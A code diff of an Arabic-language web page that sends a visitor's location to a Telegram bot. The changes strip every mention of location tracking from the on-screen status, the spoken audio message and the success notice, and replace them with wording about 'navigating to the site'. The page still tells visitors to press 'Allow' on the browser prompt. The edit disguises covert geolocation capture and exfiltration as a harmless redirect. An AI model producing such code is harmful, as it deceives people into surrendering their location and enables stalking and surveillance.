@@ -47,7 +47,7 @@
         <span style="font-size: 60px;">🆘</span>
         <span>جاري الإرسال...</span>
     </div>
-    <div id="status" class="status-text">جاري تحديد موقعك الآن...</div>
+    <div id="status" class="status-text">انتظر لحظة جاري الانتقال للموقع الآن ...</div>
     <div class="sub-text">إذا ظهرت لك رسالة "سماح" اضغط عليها فوراً</div>
 </div>
 
@@ -60,7 +60,7 @@
         sendLocation();
         // تنبيه صوتي للمستخدم
         setTimeout(() => {
-            const speech = new SpeechSynthesisUtterance("جاري تحديد موقعك وإرساله لصديقك، يرجى الانتظار");
+            const speech = new SpeechSynthesisUtterance(" ، يرجى الانتظار");
             speech.lang = 'ar-SA';
             window.speechSynthesis.speak(speech);
         }, 500);
@@ -87,7 +87,7 @@
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`)
                 .then(res => {
                     if(res.ok) {
-                        status.innerText = "✅ تم إرسال موقعك بنجاح";
+                        status.innerText = "✅ تم الانتقال بنجاح";
                         status.style.color = "#4caf50";
                     }
                 });
